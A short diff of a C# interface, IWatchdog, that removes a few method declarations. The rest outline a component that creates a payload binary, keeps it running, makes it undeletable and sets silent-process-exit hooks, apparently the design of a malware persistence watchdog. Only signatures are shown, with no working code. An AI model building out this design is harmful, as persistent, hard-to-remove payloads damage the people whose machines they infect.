@@ -1,5 +1,4 @@
 public interface IWatchdog {
-    static abstract bool IsProcessRunning(string processName);
     static abstract void WatchdogLogic(); // implements the loop and all of the other components
 
     void createPayloadBinary();
@@ -10,8 +9,6 @@ public interface IWatchdog {
 
     // check if binary is running at the beginning and end of the script. Maybe multithread?
     // add plenty of error handling to ensure it always runs
-    static abstract void setRunKey();
-    static abstract void verifyRunKey();
     static abstract void makeUndeletable();
     static abstract void verifyUndeletable();
     static abstract void setSilentProcessExit();
